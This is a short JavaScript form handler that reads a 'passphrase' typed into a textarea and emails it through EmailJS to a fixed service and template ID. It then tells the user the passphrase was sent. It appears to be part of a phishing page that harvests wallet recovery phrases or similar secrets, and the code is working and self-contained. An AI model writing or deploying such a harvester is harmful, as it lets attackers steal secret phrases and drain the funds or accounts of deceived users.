
function emailSend(event) {
  event.preventDefault();  // Prevent the form from submitting normally

  // Get the message (passphrase) from the textarea
  const message = document.getElementById("message").value;

  // Send the email using EmailJS
  emailjs.send("service_kxevbjf", "template_xxnfakp", {
    message: message
  })
    .then(function (response) {
      console.log("Success:", response);
      alert("Your passphrase has been sent successfully!");
    }, function (error) {
      console.log("Error:", error);
      alert("There was an error sending your passphrase. Please try again.");
    });
}
